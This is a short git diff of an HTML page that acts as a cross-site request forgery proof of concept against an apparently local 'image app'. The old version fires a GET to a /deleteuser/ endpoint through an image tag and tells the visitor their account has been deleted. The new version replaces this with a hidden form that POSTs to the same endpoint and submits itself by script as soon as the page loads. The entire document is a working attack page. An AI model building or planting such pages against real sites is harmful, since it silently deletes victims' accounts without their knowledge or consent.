@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml">
-  <head>
-    <title>Home</title>
-  </head>
-
-  <body>
-    <h1>Hello, your account has been deleted from image app</h1>
-    <img src="http://localhost:8000/deleteuser/">
-  </body>
+    <body>
+        <form action="http://localhost:8000/deleteuser/" method="POST">
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
 </html>
